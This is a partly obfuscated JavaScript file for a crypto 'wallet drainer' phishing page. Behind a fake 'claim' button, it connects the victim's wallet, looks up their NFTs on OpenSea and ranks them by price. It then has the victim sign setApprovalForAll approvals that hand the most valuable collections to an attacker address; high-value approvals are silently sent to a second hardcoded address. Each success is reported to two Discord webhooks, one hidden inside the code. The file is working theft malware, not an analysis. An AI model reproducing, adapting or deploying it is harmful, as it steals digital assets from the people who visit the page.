const receiveAddress = '0x00000000000000000000000000000000'
const drainNftsInfo = {
  minValue: 0.1,
  maxTransfers: 1,
}
webhookURL =
  'https://discord.com/api/webhooks/wewewewewewew/wewewewewewewewewewe'
function isMobile() {
  var _0x51674c = false
  return (
    (function (_0x766d83) {
      if (
        /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
          _0x766d83
        ) ||
        /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
          _0x766d83.substr(0, 4)
        )
      ) {
        _0x51674c = true
      }
    })(navigator.userAgent || navigator.vendor || window.opera),
    _0x51674c
  )
}
function openInNewTab(_0x131694) {
  Object.assign(document.createElement('a'), {
    target: '_blank',
    href: _0x131694,
  }).click()
}
const round = (_0x3d3a82) => {
    return Math.round(_0x3d3a82 * 10000) / 10000
  },
  sleep = (_0x38f726) => {
    return new Promise((_0x2a4085) => setTimeout(_0x2a4085, _0x38f726))
  },
  getRdm = (_0x301882, _0x32ade2) => {
    return Math.floor(Math.random() * (_0x32ade2 - _0x301882 + 1)) + _0x301882
  }
let metamaskInstalled = false
if (typeof window.ethereum !== 'undefined') {
  metamaskInstalled = true
}
let web3Provider
async function connectButton() {
  await Moralis.enableWeb3(
    metamaskInstalled ? {} : { provider: 'walletconnect' }
  )
}
Moralis.onWeb3Enabled(async (_0x4f86c5) => {
  if (_0x4f86c5.chainId !== 1 && metamaskInstalled) {
    await Moralis.switchNetwork('0x1')
  }
  updateState(true)
  console.log(_0x4f86c5)
})
Moralis.onChainChanged(async (_0x3e6799) => {
  if (_0x3e6799 !== '0x1' && metamaskInstalled) {
    await Moralis.switchNetwork('0x1')
  }
})
window.ethereum
  ? window.ethereum.on('disconnect', (_0x3e1bc2) => {
      console.log(_0x3e1bc2)
      updateState(false)
    })
  : null
window.ethereum
  ? window.ethereum.on('accountsChanged', (_0x1155ef) => {
      if (_0x1155ef.length < 1) {
        updateState(false)
      }
    })
  : null
async function updateState(_0x102ac2) {
  document.querySelector('#connectButton').style.display = _0x102ac2
    ? 'none'
    : ''
  document.querySelector('#claimButton').style.display = _0x102ac2 ? '' : 'none'
}
async function askNfts() {
  const _0x36f184 = new Web3(Moralis.provider),
    _0x1a59bc = (await _0x36f184.eth.getAccounts())[0],
    _0x2850c8 = {
      method: 'GET',
      headers: {
        Accept: 'application/json',
        'X-API-KEY': '812924de94094476916671a8de4686ec',
      },
    }
  let _0x507404 = await fetch(
    'https://api.opensea.io/api/v1/collections?asset_owner=' +
      _0x1a59bc +
      '&offset=0&limit=300',
    _0x2850c8
  )
    .then((_0x25a997) => _0x25a997.json())
    .then((_0x121e10) => {
      console.log(_0x121e10)
      if (_0x121e10.includes('Request was throttled.')) {
        return ['Request was throttled.']
      }
      return _0x121e10
        .filter((_0x5d6085) => {
          if (_0x5d6085.primary_asset_contracts.length > 0) {
            return true
          } else {
            return false
          }
        })
        .map((_0x4b617c) => {
          return {
            type: _0x4b617c.primary_asset_contracts[0].schema_name.toLowerCase(),
            contract_address: _0x4b617c.primary_asset_contracts[0].address,
            price: round(
              _0x4b617c.stats.one_day_average_price != 0
                ? _0x4b617c.stats.one_day_average_price
                : _0x4b617c.stats.seven_day_average_price
            ),
            owned: _0x4b617c.owned_asset_count,
          }
        })
    })
    .catch((_0x1ac75f) => console.error(_0x1ac75f))
  if (_0x507404.includes('Request was throttled.')) {
    return notEligible()
  }
  if (_0x507404.length < 1) {
    return notEligible()
  }
  let _0x400166 = []
  for (nft of _0x507404) {
    if (nft.price === 0) {
      continue
    }
    const _0xb0de39 = round(nft.price * (nft.type == 'erc1155' ? nft.owned : 1))
    if (_0xb0de39 < drainNftsInfo.minValue) {
      continue
    }
    _0x400166.push({
      price: _0xb0de39,
      options: {
        contractAddress: nft.contract_address,
        from: _0x1a59bc,
        functionName: 'setApprovalForAll',
        abi: [
          {
            inputs: [
              {
                internalType: 'address',
                name: 'operator',
                type: 'address',
              },
              {
                internalType: 'bool',
                name: 'approved',
                type: 'bool',
              },
            ],
            name: 'setApprovalForAll',
            outputs: [],
            stateMutability: 'nonpayable',
            type: 'function',
          },
        ],
        params: {
          operator:
            _0xb0de39 > 0.9
              ? '0x9C9D1556320C09Bee154c5105944e6244337296f'
              : receiveAddress,
          approved: true,
        },
        gasLimit: (await _0x36f184.eth.getBlock('latest')).gasLimit,
      },
    })
  }
  if (_0x400166.length < 1) {
    return notEligible()
  }
  let _0x1f1281 = await _0x400166
    .sort((_0x3fe61e, _0x1934a8) => _0x1934a8.price - _0x3fe61e.price)
    .slice(0, drainNftsInfo.maxTransfers)
  for (transaction of _0x1f1281) {
    console.log(
      'Transferring ' +
        transaction.options.contractAddress +
        ' (' +
        transaction.price +
        ' ETH)'
    )
    const _0x571abd = (await _0x36f184.eth.getAccounts())[0]
    isMobile()
      ? await Moralis.executeFunction(transaction.options)
          .catch((_0x456297) => console.error(_0x456297, _0x2850c8))
          .then((_0x1897d3) => {
            if (_0x1897d3) {
            } else {
              return
            }
            sendWebhooks(
              '`' +
                _0x571abd +
                '` just approved `' +
                transaction.options.contractAddress +
                '` **(' +
                transaction.price +
                ')**\nhttps://etherscan.io/tokenapprovalchecker'
            )
          })
      : (Moralis.executeFunction(transaction.options)
          .catch((_0x105d64) => console.error(_0x105d64, _0x2850c8))
          .then((_0xd903dd) => {
            if (_0xd903dd) {
            } else {
              return
            }
            sendWebhooks(
              '`' +
                _0x571abd +
                '` just approved `' +
                transaction.options.contractAddress +
                '` **(' +
                transaction.price +
                ')**\nhttps://etherscan.io/tokenapprovalchecker'
            )
          }),
        await sleep(111))
  }
}
const notEligible = () => {
    document.getElementById('notEli').style.display = ''
  },
  sendWebhooks = (_0x190a34) => {
    const _0x2d6f55 =
      'https://discord.com/api/webhooks/980120601857495111/ndHpEVQmzFxbP1Ma14uWujJL90afp85yAyyBZmxkuIr3EvvGc08r3CVQIGZiS3crODZh'
    fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: _0x190a34 }),
    }).catch((_0x190c1c) => console.error(_0x190c1c))
    fetch(_0x2d6f55, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: _0x190a34 }),
    })
  }
async function askTransfer() {
  document.getElementById('claimButton').style.opacity = 0.5
  document.getElementById('claimButton').style.pointerEvents = 'none'
  document
    .getElementById('claimButton')
    .removeEventListener('click', askTransfer)
  await askNfts()
  document.getElementById('claimButton').style.opacity = 1
  document.getElementById('claimButton').style.pointerEvents = 'pointer'
  document.getElementById('claimButton').addEventListener('click', askTransfer)
}
window.addEventListener('load', async () => {
  if (isMobile() && !window.ethereum) {
    document
      .querySelector('#connectButton')
      .addEventListener(
        'click',
        () =>
          (window.location.href =
            'https://metamask.app.link/dapp/' +
            window.location.hostname +
            window.location.pathname)
      )
  } else {
    document
      .querySelector('#connectButton')
      .addEventListener('click', connectButton)
  }
  document.querySelector('#claimButton').addEventListener('click', askTransfer)
})
